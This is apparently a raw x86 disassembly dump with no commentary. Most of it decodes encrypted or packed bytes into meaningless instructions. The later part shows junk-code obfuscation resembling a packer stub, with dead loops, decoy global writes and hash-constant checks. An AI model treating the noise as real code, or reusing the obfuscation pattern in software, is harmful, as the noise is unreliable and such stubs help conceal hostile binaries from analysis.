  41bb9b:	mov    WORD PTR [eax],ss
  41bb9d:	mov    ecx,0xe48cff72
  41bba2:	lock xchg BYTE PTR [ebp+0x9],ch
  41bba6:	add    cl,0xfc
  41bba9:	push   cs
  41bbaa:	popf   
  41bbab:	das    
  41bbac:	mov    edi,0x80f96b63
  41bbb1:	xor    ecx,esp
  41bbb3:	add    eax,0x1b75445b
  41bbb8:	xchg   ebx,eax
  41bbb9:	xchg   edx,eax
  41bbba:	lock (bad) 
  41bbbc:	mov    dh,0xe0
  41bbbe:	imul   BYTE PTR [ebx]
  41bbc0:	xor    eax,0x6b35056
  41bbc5:	sub    dh,BYTE PTR [ecx-0x6ce803fc]
  41bbcb:	nop
  41bbcc:	sub    eax,0x3f272608
  41bbd1:	cmp    ebx,DWORD PTR [esi+0x5f]
  41bbd4:	xchg   esi,eax
  41bbd5:	adc    eax,0x4bd9ce6
  41bbda:	ret    0x2cae
  41bbdd:	std    
  41bbde:	mov    ax,ds:0x2d7b7370
  41bbe5:	sbb    al,0xd5
  41bbe7:	aas    
  41bbe8:	push   cs
  41bbe9:	sub    eax,DWORD PTR [ebp+ecx*1-0x2e]
  41bbed:	jecxz  0x41bc52
  41bbef:	push   0xf9a00e13
  41bbf4:	aad    0x5d
  41bbf6:	ins    DWORD PTR es:[edi],dx
  41bbf7:	std    
  41bbf8:	mov    ds:0xd0c4d910,al
  41bbfd:	pop    ss
  41bbfe:	inc    edx
  41bbff:	mov    al,ds:0xc3d7bfe6
  41bc04:	jmp    0xe2d884b5
  41bc09:	sbb    al,0x20
  41bc0b:	mov    edi,0xdbc0d917
  41bc10:	mov    ecx,0x2d8583b6
  41bc15:	jmp    0x6cad727a
  41bc1a:	je     0x41bc43
  41bc1c:	inc    esp
  41bc1d:	dec    DWORD PTR [ebx+0x56d2cf94]
  41bc23:	test   BYTE PTR [edi],ah
  41bc25:	push   edx
  41bc26:	sub    DWORD PTR [ecx+0x1a],ecx
  41bc29:	pop    edx
  41bc2a:	or     al,0x9e
  41bc2c:	or     DWORD PTR [eax],eax
  41bc2e:	retf   0x940f
  41bc31:	hlt    
  41bc32:	add    bl,dl
  41bc34:	test   ch,dl
  41bc36:	mul    BYTE PTR [eax-0x3b7be9d9]
  41bc3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc3d:	dec    edi
  41bc3e:	dec    ecx
  41bc3f:	push   cs
  41bc40:	jbe    0x41bc13
  41bc42:	nop
  41bc43:	pop    esp
  41bc44:	in     al,dx
  41bc45:	out    0x9e,al
  41bc47:	scas   al,BYTE PTR es:[edi]
  41bc48:	xor    al,0xfd
  41bc4a:	cmp    eax,0x242908ac
  41bc4f:	and    BYTE PTR [esi-0x1472a478],ah
  41bc55:	jecxz  0x41bc82
  41bc57:	stc    
  41bc58:	mov    ebp,0x3b7ed930
  41bc5d:	pop    ebx
  41bc5e:	mov    edx,0x6d531c42
  41bc63:	(bad)  
  41bc64:	or     edx,esp
  41bc66:	xchg   ebx,eax
  41bc67:	cld    
  41bc68:	cdq    
  41bc69:	retf   
  41bc6a:	pop    ss
  41bc6b:	add    DWORD PTR [ecx+0xf5566c],ebx
  41bc71:	mov    ah,0xa1
  41bc73:	jecxz  0x41bce1
  41bc75:	(bad)  
  41bc76:	jae    0x41bc1f
  41bc78:	or     ebx,DWORD PTR [edx+0x50f683d9]
  41bc7e:	mov    dl,0x7d
  41bc80:	mov    edx,0xbf00419a
  41bc85:	stos   BYTE PTR es:[edi],al
  41bc86:	jne    0x41bc8c
  41bc88:	push   0x3d
  41bc8a:	jp     0x41bc36
  41bc8c:	jmp    0x23f744e3
  41bc91:	mov    WORD PTR cs:[ebp+0x12],?
  41bc95:	ja     0x41bd06
  41bc97:	ret    
  41bc98:	push   esp
  41bc99:	repnz xor BYTE PTR ds:0x83d5079,0xbb
  41bca1:	iret   
  41bca2:	(bad)  
  41bca3:	and    BYTE PTR [ebx],cl
  41bca5:	mov    ecx,0x99e18fe6
  41bcaa:	aas    
  41bcab:	ins    BYTE PTR es:[edi],dx
  41bcac:	dec    esi
  41bcad:	(bad)  
  41bcaf:	dec    eax
  41bcb0:	aam    0x17
  41bcb2:	int3   
  41bcb3:	pop    eax
  41bcb4:	in     al,dx
  41bcb5:	mov    cl,0xec
  41bcb7:	push   es
  41bcb8:	jmp    0xb955d1d0
  41bcbd:	(bad)  
  41bcbe:	mov    bl,0x22
  41bcc0:	dec    ecx
  41bcc1:	lea    esi,[edx+0x60]
  41bcc4:	xchg   ebp,eax
  41bcc5:	outs   dx,DWORD PTR ds:[esi]
  41bcc6:	jge    0x41bce7
  41bcc8:	retf   
  41bcc9:	(bad)  
  41bcca:	mov    al,ds:0xf8af6625
  41bccf:	jecxz  0x41bccb
  41bcd1:	inc    esi
  41bcd2:	imul   ebp,DWORD PTR [esi+ebp*8+0x61],0x1a917f4a
  41bcda:	mov    ds:0xa8f018c0,eax
  41bcdf:	mov    BYTE PTR [esp+ebp*4],bl
  41bce2:	push   edx
  41bce3:	cmp    BYTE PTR [ebp-0x72],dl
  41bce6:	jno    0x41bd2d
  41bce8:	(bad)  
  41bce9:	loop   0x41bc6c
  41bceb:	mov    cl,ah
  41bced:	push   esp
  41bcee:	call   0x18a5:0x80ac00da
  41bcf5:	lea    esp,[edx]
  41bcf7:	aad    0x41
  41bcf9:	jle    0x41bd27
  41bcfb:	mov    bh,0xb5
  41bcfd:	sbb    eax,0xd3f3ef5f
  41bd02:	and    al,0x8
  41bd04:	mov    eax,0x569e0201
  41bd09:	pop    ss
  41bd0a:	xor    DWORD PTR [edi-0x4e2013d6],edi
  41bd10:	(bad)  
  41bd12:	imul   ebp,DWORD PTR [ebx],0x65
  41bd15:	push   es
  41bd16:	sub    BYTE PTR [edx-0x1a],bh
  41bd19:	pop    edx
  41bd1a:	cli    
  41bd1b:	mov    esp,0xa7799cf0
  41bd20:	ja     0x41bd29
  41bd22:	dec    esi
  41bd23:	mov    esp,0xd7f13606
  41bd28:	xchg   esi,eax
  41bd29:	jnp    0x41bd99
  41bd2b:	cld    
  41bd2c:	jle    0x41bcc9
  41bd2e:	ret    
  41bd2f:	add    al,0x54
  41bd31:	sahf   
  41bd32:	(bad)  
  41bd33:	fsubr  QWORD PTR [esi]
  41bd35:	pop    edi
  41bd36:	mov    eax,0xd89c0d0b
  41bd3b:	cmp    BYTE PTR [edi-0x52],0xb5
  41bd3f:	aam    0x6d
  41bd41:	iret   
  41bd42:	fwait
  41bd43:	mov    al,0xa3
  41bd45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd46:	or     DWORD PTR [edx],edi
  41bd48:	lods   eax,DWORD PTR ds:[esi]
  41bd49:	inc    edi
  41bd4a:	jge    0x41bd04
  41bd4c:	pop    esp
  41bd4d:	and    al,0x53
  41bd4f:	ins    BYTE PTR es:[edi],dx
  41bd50:	mov    WORD PTR [edx+0x17],gs
  41bd53:	cmp    BYTE PTR [ebx-0x76b59ff1],ah
  41bd59:	cmp    eax,0xf38a5c0c
  41bd5e:	out    dx,al
  41bd5f:	cmc    
  41bd60:	push   esp
  41bd61:	aam    0x5a
  41bd63:	push   esi
  41bd64:	inc    edx
  41bd65:	xor    eax,DWORD PTR ds:0xbc70fc43
  41bd6b:	sysenter 
  41bd6d:	xor    bl,BYTE PTR [edi+0x455c6436]
  41bd73:	jmp    0xfcb:0x801555c5
  41bd7a:	pushf  
  41bd7b:	mov    ebp,0x21d679dd
  41bd80:	inc    ebp
  41bd81:	push   ds
  41bd82:	mov    esi,0x9cbf3ce3
  41bd87:	je     0x41bdff
  41bd89:	pop    ebx
  41bd8a:	adc    eax,0xb08d15a3
  41bd8f:	retf   
  41bd90:	std    
  41bd91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd92:	mov    esi,0x403d9e50
  41bd97:	xchg   DWORD PTR [ecx-0x32],edx
  41bd9a:	jnp    0x41bd46
  41bd9c:	mov    ah,0x92
  41bd9e:	jle    0x41bdee
  41bda0:	out    dx,eax
  41bda1:	sub    esp,DWORD PTR [esi-0x75df708c]
  41bda7:	loopne 0x41bdad
  41bda9:	inc    eax
  41bdaa:	adc    al,0x7a
  41bdac:	dec    ecx
  41bdad:	out    0x99,al
  41bdaf:	outs   dx,DWORD PTR ds:[esi]
  41bdb0:	out    dx,al
  41bdb1:	inc    esp
  41bdb2:	or     eax,DWORD PTR [eax]
  41bdb4:	popf   
  41bdb5:	cmp    dl,dh
  41bdb7:	adc    BYTE PTR [edx+0x2a2cd437],ch
  41bdbd:	pop    ebp
  41bdbe:	les    ebp,FWORD PTR [eax-0x301d592f]
  41bdc4:	xchg   ebp,eax
  41bdc5:	mov    ds:0x8d87d507,eax
  41bdca:	or     eax,0x7d751af4
  41bdcf:	push   eax
  41bdd0:	mov    edi,0x4e1f9402
  41bdd5:	ja     0x41bdeb
  41bdd7:	xlat   BYTE PTR ds:[ebx]
  41bdd8:	or     eax,0xeab48413
  41bddd:	jg     0x41be39
  41bddf:	les    edi,FWORD PTR [esi]
  41bde1:	push   0x45
  41bde3:	push   0x83a43793
  41bde8:	leave  
  41bde9:	imul   ebx,DWORD PTR ds:0x9b3f4dcf,0x1701350f
  41bdf3:	mov    al,0x25
  41bdf5:	or     eax,0xb28feaa5
  41bdfa:	push   0x36
  41bdfc:	fmul   DWORD PTR [edi]
  41bdfe:	or     al,0x2c
  41be00:	or     ebp,DWORD PTR [ecx]
  41be02:	xlat   BYTE PTR ds:[ebx]
  41be03:	dec    eax
  41be04:	in     al,dx
  41be05:	lds    ecx,FWORD PTR [esi]
  41be07:	test   eax,0xcbb1b395
  41be0c:	jo     0x41be3f
  41be0e:	cmp    bh,dl
  41be10:	pop    ebp
  41be11:	jae    0x41bdf6
  41be13:	dec    esp
  41be14:	push   esi
  41be15:	out    dx,eax
  41be16:	xor    BYTE PTR [ecx+0x249058df],0x2c
  41be1d:	ja     0x41be73
  41be1f:	ficom  DWORD PTR [edx-0x53]
  41be22:	adc    al,0xb1
  41be24:	xor    DWORD PTR [esi+0x7a],esi
  41be27:	loope  0x41bdd4
  41be29:	and    esi,DWORD PTR [ebp-0x5]
  41be2c:	jmp    0x831ee9fc
  41be31:	cli    
  41be32:	jp     0x41be2a
  41be34:	mov    ds:0x6f64fc2c,al
  41be39:	mov    bl,0x56
  41be3b:	mov    edi,0x7fc95353
  41be40:	push   esi
  41be41:	test   al,bl
  41be43:	repnz adc al,0x1d
  41be46:	xchg   ebx,eax
  41be47:	(bad)  [edx+0x3cc67a7e]
  41be4d:	ficom  DWORD PTR [ecx]
  41be4f:	jge    0x41be3f
  41be51:	call   0xa60a:0x8573ea97
  41be58:	das    
  41be59:	mov    eax,0x941153be
  41be5e:	lods   al,BYTE PTR ds:[esi]
  41be5f:	jne    0x41be0c
  41be61:	lea    edi,[esi+0x73e364a9]
  41be67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be68:	adc    BYTE PTR [ecx],cl
  41be6a:	nop
  41be6b:	push   edi
  41be6c:	sti    
  41be6d:	lods   eax,DWORD PTR ds:[esi]
  41be6e:	mov    ch,BYTE PTR [eax-0x2cd8a81b]
  41be74:	fwait
  41be75:	into   
  41be76:	ret    0x946e
  41be79:	xor    eax,0x1ae9dba4
  41be7e:	lea    eax,[edi]
  41be80:	xor    bh,BYTE PTR [eax-0x43b80872]
  41be86:	mov    ah,0x9b
  41be88:	nop
  41be89:	aas    
  41be8a:	mov    cl,0x99
  41be8c:	jge    0x41be0f
  41be8e:	inc    ebp
  41be8f:	cld    
  41be90:	mov    bh,BYTE PTR [esi-0x18e69ae8]
  41be96:	xchg   ebx,eax
  41be97:	push   esp
  41be98:	(bad)  
  41be99:	jmp    0x41bea5
  41be9b:	fst    QWORD PTR [ebp+0x744b6015]
  41bea1:	xchg   esi,eax
  41bea2:	mov    dl,0x8f
  41bea4:	push   cs
  41bea5:	idiv   BYTE PTR [eax-0x3a]
  41bea8:	mov    edi,0x47da0440
  41bead:	ud1    esi,edx
  41beb0:	cmp    DWORD PTR [ecx+0x4b],edi
  41beb3:	push   esp
  41beb4:	shr    ebx,1
  41beb6:	push   esi
  41beb7:	xchg   esi,eax
  41beb8:	ss in  al,0x17
  41bebb:	pop    ecx
  41bebc:	push   edx
  41bebd:	add    ch,cl
  41bebf:	(bad)  
  41bec0:	dec    edx
  41bec1:	push   ebp
  41bec2:	jecxz  0x41be9d
  41bec4:	adc    DWORD PTR [edx+eiz*8-0x44],eax
  41bec8:	leave  
  41bec9:	out    0x13,al
  41becb:	jnp    0x41be6b
  41becd:	fidiv  DWORD PTR [ecx]
  41becf:	and    al,al
  41bed1:	or     DWORD PTR ds:0xb0b368d2,esi
  41bed7:	pop    esi
  41bed8:	call   0xc278:0x95cfa3c1
  41bedf:	and    eax,0xf1cf2dbb
  41bee4:	mov    bl,0xb8
  41bee6:	repnz add esp,DWORD PTR ds:0xdb7a1fd2
  41beed:	jmp    0x41bef2
  41beef:	call   0x363fac60
  41bef4:	jb     0x41bf1d
  41bef6:	xor    ebp,esi
  41bef8:	and    al,0x18
  41befa:	and    eax,0x9a8f480c
  41beff:	into   
  41bf00:	or     edx,DWORD PTR [edi+eiz*1]
  41bf03:	in     ax,0x30
  41bf06:	mov    ah,0xb4
  41bf08:	jbe    0x41beac
  41bf0a:	sbb    esp,esp
  41bf0c:	xchg   ecx,eax
  41bf0d:	js     0x41bea4
  41bf0f:	in     al,dx
  41bf10:	mov    dh,BYTE PTR ds:0x211d1348
  41bf16:	jae    0x41bef7
  41bf18:	mov    cs,WORD PTR [edx+ecx*8+0x2c]
  41bf1c:	mov    ds:0x5e2e1ca2,eax
  41bf21:	add    BYTE PTR [edx+0x5c],ah
  41bf24:	push   0xffffff97
  41bf26:	cdq    
  41bf27:	or     esp,DWORD PTR [eax]
  41bf29:	in     eax,dx
  41bf2a:	mov    al,0x95
  41bf2c:	xchg   ecx,eax
  41bf2d:	popa   
  41bf2e:	or     BYTE PTR [edi],0x10
  41bf31:	inc    esi
  41bf32:	(bad)  
  41bf34:	add    bh,BYTE PTR [eax]
  41bf36:	loopne 0x41bee8
  41bf38:	mov    ebx,0x4f1dacb1
  41bf3d:	adc    DWORD PTR [eax],esi
  41bf3f:	lahf   
  41bf40:	fwait
  41bf41:	mov    ds:0x30f588f2,al
  41bf46:	xchg   DWORD PTR [ecx-0x26bfa087],esi
  41bf4c:	jl     0x41bf6c
  41bf4e:	sub    cl,al
  41bf50:	je     0x41bf6c
  41bf52:	jae    0x41bf72
  41bf54:	pop    ds
  41bf55:	sub    al,0xfc
  41bf57:	in     al,0x44
  41bf59:	xlat   BYTE PTR ds:[ebx]
  41bf5a:	add    eax,0x252449cb
  41bf5f:	lds    ebp,FWORD PTR [ecx-0x3fa0744a]
  41bf65:	std    
  41bf66:	sbb    DWORD PTR [ebx],esp
  41bf68:	add    ecx,DWORD PTR [ebp+0x32]
  41bf6b:	repz jnp 0x41bf57
  41bf6e:	retf   
  41bf6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf70:	xchg   ebp,eax
  41bf71:	mov    WORD PTR [ecx],cs
  41bf73:	pop    edi
  41bf74:	mov    eax,ds:0x88d70f52
  41bf79:	xchg   ecx,eax
  41bf7a:	cmp    BYTE PTR [ecx+0x69],dh
  41bf7d:	dec    ebx
  41bf7e:	in     eax,0xe3
  41bf80:	arpl   ax,si
  41bf82:	ss loop 0x41bf42
  41bf85:	int    0x83
  41bf87:	lods   eax,DWORD PTR ds:[esi]
  41bf88:	shl    DWORD PTR ds:0xaa3cc779,1
  41bf8e:	sub    eax,0x5ae377d9
  41bf93:	loop   0x41bff8
  41bf95:	push   ebx
  41bf96:	adc    ebp,DWORD PTR [esi]
  41bf98:	and    eax,0xa50250c2
  41bf9d:	jle    0x41bfc3
  41bf9f:	dec    ecx
  41bfa0:	mov    ch,0xc0
  41bfa2:	cld    
  41bfa3:	je     0x41bfa1
  41bfa5:	jle    0x41bf87
  41bfa7:	sbb    BYTE PTR [esi+ebp*4+0x4f],bh
  41bfab:	mov    eax,0xb29ca324
  41bfb0:	cmp    BYTE PTR [ebx+esi*1-0x397cd01d],0x17
  41bfb8:	add    eax,0xda6e83aa
  41bfbd:	xchg   edx,eax
  41bfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfbf:	xchg   esp,eax
  41bfc0:	or     DWORD PTR [ecx+0x6d],ebp
  41bfc3:	ror    BYTE PTR [edi],cl
  41bfc5:	sub    eax,0x5a179102
  41bfca:	push   ss
  41bfcb:	ja     0x41bf9b
  41bfcd:	xchg   ebp,eax
  41bfce:	mov    al,0xe1
  41bfd0:	inc    ebx
  41bfd1:	mov    ds,edx
  41bfd3:	xor    dh,BYTE PTR [eax-0x55]
  41bfd6:	scas   eax,DWORD PTR es:[edi]
  41bfd7:	dec    eax
  41bfd8:	dec    ebx
  41bfd9:	(bad)  
  41bfda:	in     eax,0x9a
  41bfdc:	jb     0x41c049
  41bfde:	sar    edi,1
  41bfe0:	ins    BYTE PTR es:[edi],dx
  41bfe1:	test   eax,0xff9de40e
  41bfe6:	jmp    0x27438357
  41bfeb:	loop   0x41bf78
  41bfed:	jo     0x41bfc6
  41bfef:	inc    edi
  41bff0:	xcrypt-ecb (bad)
  41bff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bff2:	dec    esp
  41bff3:	or     al,0x7a
  41bff5:	mov    ebp,0xb263778e
  41bffa:	es fs xchg ebx,eax
  41bffd:	int3   
  41bffe:	mov    al,0xdb
  41c000:	push   ss
  41c001:	test   esi,0xf67eff01
  41c007:	outs   dx,BYTE PTR ds:[esi]
  41c008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c009:	call   0xed84:0x14a0be44
  41c010:	jl     0x41c025
  41c012:	and    BYTE PTR [ebx],al
  41c014:	pop    ds
  41c015:	nop
  41c016:	scas   al,BYTE PTR es:[edi]
  41c017:	ror    ecx,0x4d
  41c01a:	and    DWORD PTR [edx-0x32],ebx
  41c01d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c01e:	cwde   
  41c01f:	pop    edx
  41c020:	xor    bh,BYTE PTR [ebx-0x72]
  41c023:	jge    0x41c01e
  41c025:	adc    eax,0xacbe9e18
  41c02a:	lods   eax,DWORD PTR ds:[esi]
  41c02b:	inc    edx
  41c02c:	sub    dl,BYTE PTR [ebx]
  41c02e:	dec    esp
  41c02f:	popf   
  41c030:	push   ebx
  41c031:	fistp  QWORD PTR [eax+0x722ab6be]
  41c037:	cwde   
  41c038:	shr    DWORD PTR ds:0x94b4cbd3,cl
  41c03e:	add    BYTE PTR [edx-0x70],bh
  41c041:	xchg   edi,eax
  41c042:	pop    esp
  41c043:	inc    ebx
  41c044:	inc    edx
  41c045:	inc    ecx
  41c046:	pop    ebx
  41c047:	adc    esp,DWORD PTR [ecx-0x18]
  41c04a:	fdiv   DWORD PTR [esi+0x15]
  41c04d:	mov    al,0x10
  41c04f:	(bad)  
  41c050:	(bad)  
  41c051:	test   al,0x46
  41c053:	push   cs
  41c054:	xor    eax,DWORD PTR [ebp-0x25d04906]
  41c05a:	sbb    DWORD PTR [ebx+0x7b59eee0],0xfffffff6
  41c061:	pop    ds
  41c062:	les    esi,FWORD PTR [ecx+0x468f24c0]
  41c068:	test   DWORD PTR ds:0x58baa5f0,esp
  41c06e:	push   0x19
  41c070:	(bad)  
  41c071:	js     0x41c0df
  41c073:	sahf   
  41c074:	adc    DWORD PTR [edx],esi
  41c076:	inc    eax
  41c077:	add    edi,DWORD PTR [ecx]
  41c079:	not    ecx
  41c07b:	dec    ecx
  41c07c:	inc    edi
  41c07d:	add    eax,0xce587202
  41c082:	loop   0x41c082
  41c084:	shl    BYTE PTR [eax-0xf8490fa],cl
  41c08a:	imul   ecx,DWORD PTR ds:0xc11830e0,0xffffffa4
  41c091:	and    ebx,esp
  41c093:	es shl al,0xf0
  41c097:	or     cl,BYTE PTR [edx+0x7819e624]
  41c09d:	popa   
  41c09e:	rol    BYTE PTR [esi],cl
  41c0a0:	mov    ebx,0xdd0f58b5
  41c0a5:	jge    0x41c085
  41c0a7:	ret    0x7ce0
  41c0aa:	popf   
  41c0ab:	and    edx,eax
  41c0ad:	mov    edi,0x38a08f6f
  41c0b2:	cmp    ebx,DWORD PTR [ebx+0x1c]
  41c0b5:	lods   al,BYTE PTR ds:[esi]
  41c0b6:	outs   dx,BYTE PTR ds:[esi]
  41c0b7:	dec    DWORD PTR [edi]
  41c0b9:	push   cs
  41c0ba:	cs dec edi
  41c0bc:	faddp  st(7),st
  41c0be:	xchg   ebx,eax
  41c0bf:	sti    
  41c0c0:	mov    bh,0xf1
  41c0c2:	scas   al,BYTE PTR es:[edi]
  41c0c3:	cwde   
  41c0c4:	jmp    DWORD PTR es:[eax]
  41c0c7:	sbb    cl,BYTE PTR ds:0xf42939eb
  41c0cd:	stos   DWORD PTR es:[edi],eax
  41c0ce:	ret    0x36a6
  41c0d1:	sub    eax,0x312351be
  41c0d6:	clc    
  41c0d7:	repz sub eax,0xcb27021e
  41c0dd:	sbb    BYTE PTR [ecx],0x30
  41c0e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0e1:	jmp    0x19791018
  41c0e6:	clc    
  41c0e7:	fisttp WORD PTR [ebx+eax*2+0x47c8cb7a]
  41c0ee:	cmc    
  41c0ef:	rol    DWORD PTR [ecx-0x54],0x66
  41c0f3:	lds    edx,FWORD PTR [eax]
  41c0f5:	icebp  
  41c0f6:	pop    es
  41c0f7:	pop    ebx
  41c0f8:	pop    ds
  41c0f9:	mul    DWORD PTR [ebx]
  41c0fb:	in     al,0xe2
  41c0fd:	jne    0x41c08a
  41c0ff:	dec    ebp
  41c100:	call   0xcf7dbb08
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428cf5
  41c331:	mov    ebx,DWORD PTR ds:0x42af49
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
